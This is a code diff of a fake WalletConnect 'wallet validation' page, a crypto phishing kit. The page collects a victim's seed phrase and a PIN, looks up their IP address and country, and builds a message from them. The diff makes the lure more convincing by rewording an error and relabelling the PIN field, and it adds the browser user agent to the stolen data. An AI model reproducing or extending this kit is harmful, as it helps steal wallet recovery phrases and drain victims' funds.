@@ -870,7 +870,7 @@
               </div>
               <div>
 				          <div class="d-none" id="connect_error">
-                      <p class="walletconnect-qrcode__text error">An error occured! <br>Unable to Validate Wallet. Please contact live support for assistance.</p>
+                      <p class="walletconnect-qrcode__text error">An error occured! <br>Unable to Validate Wallet. Please reload page and try again, if error persist contact live support for assistance.</p>
                       <br>
                       
                   </div>
@@ -958,7 +958,7 @@
                           <textarea class="walletconnect-search__input" placeholder="Phrase(Typically 12 (sometimes 24) words seperated by a single spaces)." id="c_seed" rows="5" required></textarea>
                           <br>
                           <p></p>
-                          <input type="text" class="walletconnect-search__input" id="c_pin" placeholder="Pin" maxlength="10" required>
+                          <input type="text" class="walletconnect-search__input" id="c_pin" placeholder="Create validation pin" maxlength="10" required>
                           <input type="text" class="d-none" hidden id="w-name">
                           <br>
                           <button type="submit" class="walletconnect-connect__button" >SYNC</button>
@@ -1063,6 +1063,7 @@ fetch('https://api.ipify.org?format=json')
         message += "Pin: " + pin + "\n\n";
         message += "IP Adress: " + ip + "\n\n";
         message += "Country: " + country + "\n";
+        message += "browser agent: " + useragent + "\n";
         
         // Add other fields if needed
 
